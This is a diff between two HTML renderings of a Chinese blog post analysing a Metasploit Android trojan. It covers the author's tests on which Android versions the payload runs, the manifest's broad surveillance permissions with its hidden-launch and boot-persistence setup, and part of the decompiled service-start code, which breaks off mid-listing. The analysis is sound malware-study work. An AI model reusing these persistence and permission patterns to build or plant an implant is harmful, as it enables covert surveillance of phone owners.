@@ -1,595 +1,138 @@
-
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
-        <title>Msf Android马分析 | Moyao の小屋</title>
-        <meta name="author" content="Moyao">
-        <meta name="description" content="Write down something interesting I met
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="Moyao の小屋" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Moyao の小屋" type="application/atom+xml"><link rel="alternate" type="application/json" title="Moyao の小屋" href="https://demoyao100.github.io/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.2"><link rel="modulepreload" href="/js/chunk-346TEOXD.js"></link><link rel="modulepreload" href="/js/chunk-QA6RGM2S.js"></link><link rel="modulepreload" href="/js/chunk-QAWHJ5B3.js"></link><link rel="modulepreload" href="/js/index.esm-SMPOVEZ5.js"></link><link rel="modulepreload" href="/js/post-H6TTLEOZ.js"></link><link rel="modulepreload" href="/js/quicklink-RU6FD7L7.js"></link><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg" as="image" fetchpriority="high"><meta name="description" content="&lt;h6 id=&quot;preface&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#preface&quot;&gt;#&lt;/a&gt; PREFACE:&lt;/h6&gt;"/><link rel="canonical" href="https://demoyao100.github.io/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/"><title>msf Android马分析</title><meta name="generator" content="Hexo 7.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">msf Android马分析</h1><div class="meta"><span class="item" title="Created: 2024-03-28 22:08:45"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">Posted on</span><time itemprop="dateCreated datePublished" datetime="2024-03-28T22:08:45+08:00">2024-03-28</time></span><span class="item" title="Symbols count in article"><span class="icon"><i class="ic i-pen"></i></span><span class="text">Symbols count in article</span><span>16k</span><span class="text">words</span></span><span class="item" title="Reading time"><span class="icon"><i class="ic i-clock"></i></span><span class="text">Reading time</span><span>15 mins.</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="Toggle navigation bar"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">testName</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">Home</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="en"><link itemprop="mainEntityOfPage" href="https://demoyao100.github.io/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="Moyao"/><meta itemprop="description" content="Hi,I'm Moyao, Write down something interesting I met
 feel free to mail me if you have something wanted to talk about
-mail: &lt;moyaoxue@outlook.com&gt;
-">
-        <meta name="keywords" content="">
-        <link rel="icon" href="/images/head.jpg">
-        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
-        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
-        
-        <link rel="stylesheet" href="/css/fonts.min.css">
-        <link rel="stylesheet" href="/css/particlex.css">
-        
-        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
-    <meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
-        <div id="layout">
-            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
-            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
-            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
-            <transition name="into">
-                <div v-show="show_page" style="display: -not-none">
-                    <div id="menu_show">
-                         
-<nav id="menu">
-    <div class="desktop-menu">
-        <a href="/">
-            <span class="title">Moyao の小屋</span>
-        </a>
-        
-        <a href="/">
-            <i class="fa-solid fa-house fa-fw"></i>
-            <span>&ensp;home</span>
-        </a>
-        
-        <a href="/">
-            <i class="fa-solid fa-id-card fa-fw"></i>
-            <span>&ensp;about</span>
-        </a>
-        
-        <a target="_blank" rel="noopener" href="//tags/re/">
-            <i class="fa-solid fa-tags fa-fw"></i>
-            <span>&ensp;tags</span>
-        </a>
-        
-    </div>
-    <div :class="'phone-menu ' + menu_show" id="phone-menu">
-        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
-        <div :class="'title'" @click="menu_show = !menu_show">
-            <i class="fa-solid fa-bars fa-fw"></i>
-            <span>&emsp;Moyao の小屋</span>
-        </div>
-        <transition name="slide">
-        <div class="items" v-show="menu_show">
-            
-            <a href="">
-                <div class="item">
-                    <div style="min-width: 20px; max-width: 50px; width: 10%">
-                        <i class="fa-solid fa-house fa-fw"></i>
-                    </div>
-                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
-                </div>
-            </a>
-            
-            <a href="">
-                <div class="item">
-                    <div style="min-width: 20px; max-width: 50px; width: 10%">
-                        <i class="fa-solid fa-id-card fa-fw"></i>
-                    </div>
-                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
-                </div>
-            </a>
-            
-            <a href="/tags/re/">
-                <div class="item">
-                    <div style="min-width: 20px; max-width: 50px; width: 10%">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </div>
-                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
-                </div>
-            </a>
-            
-        </div>
-        </transition>
-    </div>
-</nav>
-                    </div>
-                    <div id="main">
-                        
-<div class="article">
-    <div>
-        <h1>Msf Android马分析 </h1>
-    </div>
-    <div class="info">
-        <span class="date">
-            <span class="icon">
-                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
-            </span>
-            2024/3/28
-        </span>
-        
-        
-    </div>
-    <div class="content" v-pre>
-        <h6 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE:"></a>PREFACE:</h6><span id="more"></span>
-
-<h3 id="一、运行效果以及环境搭建"><a href="#一、运行效果以及环境搭建" class="headerlink" title="一、运行效果以及环境搭建"></a>一、运行效果以及环境搭建</h3><p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423141135014.png" alt="image-20240423141135014"></p>
-<p>已知这个马上线安卓13（我的测试机环境）是会被直接拦的，尝试了一下安卓7</p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172223131.png" alt="image-20240423172223131"></p>
-<p>可以上马，上的时候不会检测权限，但是shell不进去以及文件看不到，推测是权限管理系统拦了但是马没有申请，合理怀疑是安卓6.0以后需要动态申请权限，这里的马存在一定问题</p>
-<p>这边上一个android5，不行，报错</p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172154053.png" alt="image-20240423172154053"></p>
-<p>上一个android6，成功！</p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423173618493.png" alt="image-20240423173618493"></p>
+mail: &amp;lt;moyaoxue@outlook.com&amp;gt;
+"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="Moyao の小屋"/></span><div class="body md" itemprop="articleBody"><h6 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> PREFACE:</h6>
+<span id="more"></span>
+<h3 id="一-运行效果以及环境搭建"><a class="markdownIt-Anchor" href="#一-运行效果以及环境搭建">#</a> 一、运行效果以及环境搭建</h3>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423141135014.png" alt="image-20240423141135014"></p>
+<p>已知这个马上线安卓 13（我的测试机环境）是会被直接拦的，尝试了一下安卓 7</p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172223131.png" alt="image-20240423172223131"></p>
+<p>可以上马，上的时候不会检测权限，但是 shell 不进去以及文件看不到，推测是权限管理系统拦了但是马没有申请，合理怀疑是安卓 6.0 以后需要动态申请权限，这里的马存在一定问题</p>
+<p>这边上一个 android5，不行，报错</p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172154053.png" alt="image-20240423172154053"></p>
+<p>上一个 android6，成功！</p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423173618493.png" alt="image-20240423173618493"></p>
 <p>简单看一下我们的权限：</p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423183527824.png" alt="image-20240423183527824"></p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423183527824.png" alt="image-20240423183527824"></p>
 <p>​		简单来说没什么用，大概研究一下应该是进应用沙箱了，但是权限是给满的，很奇怪，还是啥也干不了</p>
-<h3 id="二、逆向分析"><a href="#二、逆向分析" class="headerlink" title="二、逆向分析"></a>二、逆向分析</h3><h5 id="AndroidMainfest-xml"><a href="#AndroidMainfest-xml" class="headerlink" title="AndroidMainfest.xml"></a>AndroidMainfest.xml</h5><pre><code class="xml">    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.CHANGE_WIFI_STATE&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.WRITE_CONTACTS&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.WRITE_SETTINGS&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.CAMERA&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.SET_WALLPAPER&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.WRITE_CALL_LOG&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.WAKE_LOCK&quot;/&gt;
-    &lt;uses-permission android:name=&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot;/&gt;
-    &lt;uses-feature android:name=&quot;android.hardware.camera&quot;/&gt;
-    &lt;uses-feature android:name=&quot;android.hardware.camera.autofocus&quot;/&gt;
-    &lt;uses-feature android:name=&quot;android.hardware.microphone&quot;/&gt;
-</code></pre>
+<h3 id="二-逆向分析"><a class="markdownIt-Anchor" href="#二-逆向分析">#</a> 二、逆向分析</h3>
+<h5 id="androidmainfestxml"><a class="markdownIt-Anchor" href="#androidmainfestxml">#</a> AndroidMainfest.xml</h5>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SEND_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECORD_AUDIO&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CALL_PHONE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SETTINGS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CAMERA&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SET_WALLPAPER&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CALL_LOG&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_CALL_LOG&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera.autofocus&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.microphone&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
 <p>申请权限，注定这个马只能低版本使用</p>
-<pre><code class="xml">&lt;application android:label=&quot;@string/app_name&quot;&gt;
-    &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot; android:theme=&quot;@android:style/Theme.NoDisplay&quot;&gt;
-        &lt;intent-filter&gt;
-            &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
-            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
-        &lt;/intent-filter&gt;
-        &lt;intent-filter&gt;
-            &lt;data android:host=&quot;my_host&quot; android:scheme=&quot;metasploit&quot;/&gt;
-            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
-            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;
-            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;
-        &lt;/intent-filter&gt;
-    &lt;/activity&gt;
-    &lt;receiver android:label=&quot;MainBroadcastReceiver&quot; android:name=&quot;.MainBroadcastReceiver&quot;&gt;
-        &lt;intent-filter&gt;
-            &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
-        &lt;/intent-filter&gt;
-    &lt;/receiver&gt;
-    &lt;service android:exported=&quot;true&quot; android:name=&quot;.MainService&quot;/&gt;
-&lt;/application&gt;
-</code></pre>
-<p>活动类名：<code>MainActivity</code></p>
-<p>注册intent：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.NoDisplay&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;my_host&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;metasploit&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:label</span>=<span class="string">&quot;MainBroadcastReceiver&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainBroadcastReceiver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainService&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>活动类名： <code>MainActivity</code></p>
+<p>注册 intent：</p>
 <ul>
-<li><code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</code> - 指定该活动为应用程序的主要入口点。</li>
-<li><code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</code> - 指定该活动为启动器活动，即显示在设备的应用程序列表中并且可由用户启动</li>
-<li>指定了<code>metasploit</code>协议链接的主机和方案</li>
+<li><code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</code>  - 指定该活动为应用程序的主要入口点。</li>
+<li><code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</code>  - 指定该活动为启动器活动，即显示在设备的应用程序列表中并且可由用户启动</li>
+<li>指定了 <code>metasploit</code>  协议链接的主机和方案</li>
 <li>等等</li>
 </ul>
-<h5 id="MainService"><a href="#MainService" class="headerlink" title="MainService"></a>MainService</h5><pre><code class="java">public static void start() &#123;
-    Class v0_2;
-    try &#123;
-        v0_2 = Class.forName(&quot;android.app.ActivityThread&quot;);
-        goto label_5;
-    &#125;
-    catch(ClassNotFoundException v0_1) &#123;
-        return;
-        try &#123;
-        label_5:
-            Method v1 = v0_2.getMethod(&quot;currentApplication&quot;);
-            Context v0_3 = (Context)v1.invoke(null, null);
-            if(v0_3 == null) &#123;
-                new Handler(Looper.getMainLooper()).post(new c(v1));
-                return;
-            &#125;
-            MainService.startService(v0_3);
-        &#125;
-        catch(Exception v0) &#123;
-        &#125;
-        return;
-    &#125;
-    catch(Exception v0) &#123;
-        return;
-    &#125;
-&#125;
-</code></pre>
+<h5 id="mainservice"><a class="markdownIt-Anchor" href="#mainservice">#</a> MainService</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    Class v0_2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        v0_2 = Class.forName(<span class="string">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class="line">        goto label_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(ClassNotFoundException v0_1) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        label_5:</span><br><span class="line">            <span class="type">Method</span> <span class="variable">v1</span> <span class="operator">=</span> v0_2.getMethod(<span class="string">&quot;currentApplication&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">v0_3</span> <span class="operator">=</span> (Context)v1.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span>(v0_3 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title 